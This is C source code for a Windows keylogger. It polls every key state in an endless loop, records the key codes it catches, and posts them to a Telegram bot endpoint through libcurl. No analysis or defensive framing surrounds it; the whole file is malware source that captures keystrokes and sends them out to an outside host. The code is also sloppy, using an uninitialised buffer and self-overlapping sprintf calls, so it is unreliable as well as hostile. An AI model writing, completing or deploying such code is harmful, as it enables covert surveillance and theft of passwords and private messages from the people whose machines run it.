#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <winbase.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <curl/curl.h>

// Telegram Bot API URL
#define TELEGRAM_API_URL "https://api.telegram.org/bot<bot_token>/sendMessage"

// Telegram Chat ID
#define TELEGRAM_CHAT_ID "<chat_id>"

// Telegram Bot Token
#define TELEGRAM_BOT_TOKEN "<bot_token>"

// Function to send data to Telegram Bot
void sendDataToTelegram(char *data)
{
    CURL *curl;
    CURLcode res;
    char postData[2048];

    sprintf(postData, "chat_id=%s&text=%s", TELEGRAM_CHAT_ID, data);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, TELEGRAM_API_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
}

// Function to record keystrokes
void recordKeystrokes()
{
    char data[1024];
    int i;

    for(i = 8; i <= 190; i++)
    {
        if(GetAsyncKeyState(i) == -32767)
        {
            sprintf(data, "%s%s", data, "[KEY]");
            sprintf(data, "%s%s", data, "[KEYCODE]");
            sprintf(data, "%s%d", data, i);
            sprintf(data, "%s%s", data, "[/KEYCODE]");
            sprintf(data, "%s%s", data, "[/KEY]");
        }
    }

    if(strlen(data) > 0)
    {
        sendDataToTelegram(data);
    }
}

// Main function
int main()
{
    while(1)
    {
        Sleep(10);
        recordKeystrokes();
    }

    return 0;
}